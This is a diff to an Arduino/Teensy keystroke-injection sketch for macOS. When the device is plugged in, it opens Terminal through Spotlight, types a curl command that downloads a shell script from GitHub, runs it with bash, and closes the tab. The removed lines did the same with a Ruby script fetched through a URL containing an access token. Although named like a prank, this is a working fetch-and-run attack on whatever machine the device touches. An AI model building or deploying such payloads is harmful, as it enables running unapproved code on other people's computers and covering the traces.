@@ -1,30 +1,33 @@
 void setup() {
-  delay(800);
-  press(KEY_SPACE);
-  press(KEY_Z);
-  press(KEY_SLASH);
-  press(KEY_SPACE);
+  lolcatme();
+  pinMode(13, OUTPUT);
+  digitalWrite(13, HIGH);
+}
+
+void lolcatme() {
+  delay(1000);
 
   // apple space:
   press_with_modifiers(KEY_SPACE, MODIFIERKEY_GUI);
+  delay(900);
 
   // activate terminal:
   Keyboard.print("terminal");
   press(KEY_ENTER);
+  delay(900);
 
   // open a new tab:
   press_with_modifiers(KEY_T, MODIFIERKEY_GUI);
   delay(500);
   Keyboard.println("cd ~");
-  Keyboard.println("curl -fsSL 'https://raw.githubusercontent.com/robacarp/lolcatme/master/lolcatme.rb?token=AAMvB1hJekKlwMPqddCdxyIpD1ne41n0ks5Y96StwA%3D%3D' > lolcatme.rb");
-  delay(400);
-  Keyboard.println("/System/Library/Frameworks/Ruby.framework/Versions/Current/usr/bin/ruby lolcatme.rb");
+  Keyboard.println("mkdir lolcatme");
+  Keyboard.println("cd lolcatme");
+  Keyboard.println("curl -fsSL 'https://raw.githubusercontent.com/robacarp/lolcatme/master/lolcatme.sh' > lolcatme.sh");
+  delay(900);
+  Keyboard.println("bash lolcatme.sh");
 
-  delay(500);
-  press_with_modifiers(KEY_D, MODIFIERKEY_CTRL);
-
-  pinMode(11, OUTPUT);
-  digitalWrite(11, 1);
+  delay(1500);
+  press_with_modifiers(KEY_W, MODIFIERKEY_GUI);
 }
 
 void press(int key) {
